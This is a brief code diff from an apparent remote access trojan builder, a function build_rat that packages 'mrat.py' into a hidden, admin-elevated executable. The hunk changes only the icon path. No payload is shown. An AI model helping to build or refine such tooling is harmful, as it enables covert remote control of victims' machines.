@@ -36,7 +36,7 @@ def build_rat(IP, PORT, filename):
         'mrat.py',
         '--onefile',
         '--noconsole',
-        '--icon=icon.ico',
+        '--icon=./resources/icon.ico',
         f'--name={filename}',
         '--uac-admin'
     ])
